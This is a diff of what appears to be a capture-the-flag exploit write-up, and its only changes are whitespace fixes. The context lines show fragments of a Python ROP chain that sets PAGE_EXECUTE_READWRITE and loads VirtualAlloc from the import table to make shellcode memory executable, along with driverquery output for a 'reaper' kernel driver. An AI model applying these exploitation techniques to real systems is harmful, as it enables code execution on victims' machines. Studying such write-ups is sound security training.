@@ -853,7 +853,7 @@ Next I moved the value of `0x40` into `r9`; this is the value `PAGE_EXECUTE_READ
 buffer += pack("<Q", base_address + 0x1f5e7)        # pop rbx ; ret ;
 buffer += pack("<Q", 0x40)                          # 0x40
 buffer += pack("<Q", base_address + 0x1f90)         # mov r9, rbx ; mov r8, 0x0000000000000000 ; 
-																										# add rsp, 0x08 ; ret ;
+                                                    # add rsp, 0x08 ; ret ;
 buffer += b"B" * 0x8                                # padding for add rsp, 0x08
 ```
 
@@ -881,8 +881,8 @@ Next I stored the address of `VirtualAlloc` in `rax`; it will become clear why w
 # ---------------------------------------------------------------------------------
 buffer += pack("<Q", base_address + 0x150a)         # pop rax ; ret ;
 buffer += pack("<Q", base_address + 0x20000)        # VirtualAlloc IAT address
-buffer += pack("<Q", base_address + 0x1547f)        # mov rax, qword [rax] ; add rsp, 0x28 ; 
-																										# ret ;
+buffer += pack("<Q", base_address + 0x1547f)        # mov rax, qword [rax] ; add rsp, 0x28 ;
+                                                    # ret ;
 buffer += b"B" * 0x28                               # padding for add rsp, 0x28
 # rax contains the address of VirtualAlloc
 ```
@@ -1090,7 +1090,7 @@ I checked to see if the driver was running, and it was:
 
 ```
 C:\driver>driverquery /v | findstr reaper
-reaper       reaper                 reaper                 Kernel        Auto       Running    OK         TRUE        FALSE        0                 4,096       0          7/27/2023 9:12:21 AM   \??\C:\driver\reaper.sys                         4,096
+reaper  reaper  reaper Kernel  Auto  Running  OK  TRUE  FALSE  0  4,096  0  7/27/2023 9:12:21 AM  \??\C:\driver\reaper.sys  4,096
 ```
 
 I checked the version of Windows using the **systeminfo** command, if the driver was vulnerable I may have needed to understand what Kernel level mitigations were deployed:
